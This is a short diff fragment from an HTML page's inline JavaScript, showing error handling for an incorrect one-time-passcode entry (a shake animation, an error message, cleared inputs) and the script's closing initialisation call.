+          otpRow.classList.add(&#39;error&#39;, &#39;shake&#39;);
+          setTimeout(() =&gt; otpRow.classList.remove(&#39;shake&#39;), 520);
+
+          otpError.classList.remove(&#39;hidden&#39;);
+          otpError.innerHTML = &#39;&lt;i class=&#34;fas fa-exclamation-circle&#34;&gt;&lt;/i&gt; Incorrect OTP. Please try again.&#39;;
+          otpError.style.animation = &#39;none&#39;;
+          void otpError.offsetWidth;
+          otpError.style.animation = &#39;&#39;;
+
+          otpInputs.forEach(i =&gt; i.value = &#39;&#39;);
+          otpInputs[0].focus();
+        });
+      }
+
+      // ==================== INIT ====================
+      renderProblemStep();
+    })();
+    </script>
+  </body>
+</html>
